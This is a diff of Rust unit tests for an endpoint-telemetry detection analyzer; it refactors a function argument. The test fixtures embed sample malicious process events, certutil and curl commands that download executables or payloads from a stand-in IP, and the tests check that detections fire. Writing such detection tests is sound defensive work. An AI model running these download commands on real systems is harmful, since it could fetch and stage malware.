@@ -447,7 +447,7 @@ mod tests {
             "CommandLine":"certutil.exe -urlcache -f http://192.0.2.10/a.exe a.exe",
             "ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"}"#;
         let ingest = crate::telemetry::parse(ev, crate::telemetry::Format::Sysmon).unwrap();
-        let mut observed = analyzer::analyze_telemetry(&ingest.observations, &kb);
+        let mut observed = analyzer::analyze_telemetry(&ingest, &kb);
         enrich(&mut observed, &index, kb::Platform::WindowsSysmon);
         assert_eq!(verdict_for(&observed).as_deref(), Some("fires"));
 
@@ -485,7 +485,7 @@ mod tests {
             "args":["curl","-s","-O","http://192.0.2.10/payload"]}},
             "process":{"executable":{"path":"/usr/bin/osascript"}}}"#;
         let ingest = crate::telemetry::parse(ev, crate::telemetry::Format::Esf).unwrap();
-        let mut observed = analyzer::analyze_telemetry(&ingest.observations, &kb);
+        let mut observed = analyzer::analyze_telemetry(&ingest, &kb);
         enrich(&mut observed, &index, kb::Platform::MacosEs);
         assert_eq!(verdict_for(&observed).as_deref(), Some("fires"));
 
@@ -518,7 +518,7 @@ mod tests {
             "is_platform_binary":false},"args":["curl","-O","http://192.0.2.10/payload"]}},
             "process":{"executable":{"path":"/bin/zsh"}}}"#;
         let ingest = crate::telemetry::parse(ev, crate::telemetry::Format::Esf).unwrap();
-        let mut observed = analyzer::analyze_telemetry(&ingest.observations, &kb);
+        let mut observed = analyzer::analyze_telemetry(&ingest, &kb);
         enrich(&mut observed, &index, kb::Platform::MacosEs);
         assert_eq!(verdict_for(&observed).as_deref(), Some("fires"));
 
